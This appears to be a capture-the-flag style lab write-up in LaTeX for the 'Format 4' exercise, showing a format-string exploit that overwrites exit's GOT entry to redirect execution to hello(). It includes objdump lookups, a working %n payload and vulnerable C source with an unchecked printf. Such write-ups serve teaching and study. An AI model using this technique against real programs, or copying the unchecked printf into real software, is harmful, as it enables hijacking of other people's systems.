@@ -1,0 +1,82 @@
+
+\begin{center}\begin{LARGE}Format 4\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+We look at our source code and see that the end goal is to call the
+\lstinline|hello()| function. We see that there is a exit call in \lstinline|vuln|
+which we will try to exploit. There is a concept called Global Offset Table (GOT)
+which we will attempt.
+
+\begin{lstlisting}[language=bash]
+objdump -TR format4 | grep exit
+>>>00000000      DF *UND*  00000000  GLIBC_2.0   _exit
+>>>00000000      DF *UND*  00000000  GLIBC_2.0   exit
+>>>08049718 R_386_JUMP_SLOT   _exit
+>>>08049724 R_386_JUMP_SLOT   exit
+
+objdump -t format4 | grep hello
+>>>080484b4 g     F .text  0000001e              hello
+\end{lstlisting}
+
+Calling objdump, we locate the address of \lstinline|exit| call to be at 
+\lstinline|08049724| and the target function \lstinline|hello| to be at
+\lstinline|080484b4|.
+
+\subsection*{Idea and Attack process}
+
+We follow the same attack idea as before. We first need to locate the input string
+that resides on the stack. Which we will see is 3 offset.
+
+\begin{lstlisting}[language=bash]
+python -c "print 'AAAA' + '%x.'*10" | ./format4
+AAAA200.b7fd8420.bffffb14.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+\end{lstlisting}
+
+Now that we have the offset, we will follow how we modified the address location
+in format3. The idea is to use the same \lstinline|[Value, Address]| pattern
+with the needed value offset to inject into the address location. We use the same
+python code that we used to compute the needed offset. We then place the offset
+into the end os the format string followed by the "\%n" which will write the
+value to memory.
+
+\begin{lstlisting}[language=bash]
+python -c "print '\x01\x01\x01\x01\x24\x97\x04\x08\x01\x01\x01\x01\x25\x97\x04
+  \x08\x01\x01\x01\x01\x26\x97\x04\x08\x01\x01\x01\x01\x27\x97\x04\x08'
+  + '%x.'*3 + '%126u%n%208u%n%128u%n%260u%n'" | ./format4
+$%&'200.b7fd8420.bffffb14....
+code execution redirected! you win  
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+int target;
+
+void hello()
+{
+  printf("code execution redirected! you win\n");
+  _exit(1);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printf(buffer);
+
+  exit(1);  
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+\end{lstlisting}
